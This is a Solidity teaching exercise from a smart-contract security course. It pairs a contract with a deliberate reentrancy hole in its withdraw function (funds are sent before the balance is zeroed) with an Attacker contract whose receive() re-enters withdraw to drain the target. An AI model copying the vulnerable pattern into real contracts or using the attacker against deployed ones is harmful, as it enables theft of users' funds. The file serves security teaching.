// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;


/** 
	@dev This contracts includes an example of a basic reentrancy bug
	@custom:exercise This contract is part of JC's basic examples at https://github.com/jcr-security/solidity-security-teaching-resources
*/
contract Example2 {

    mapping (address => uint256) balance;
	
    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }
	
	function withdraw() external {		
		// Checks!
		require(balance[msg.sender] > 0, "Saldo cero!");	
		// Interactions D: VULNERABLE!!
		(bool success, ) = payable(msg.sender).call{value: balance[msg.sender]}("");
		require(success, "Low level call failed");
		// Effects :(
		balance[msg.sender] = 0;	
	}
	
	
	function userBalance (address user) public view returns (uint256) {
		return balance[user];
	}
}


/************************* Attacker ****************************************************/

contract Attacker {
	
	Example2 public target;
	
	
	constructor(address _target) {
		target = Example2(_target);
	}
	

	function exploit() external payable {
		target.deposit{value: 1 ether}();
		target.withdraw();
	}
	

	receive() external payable {
		if (address(target).balance >= 1 ether) {
			target.withdraw();
		}
	}

}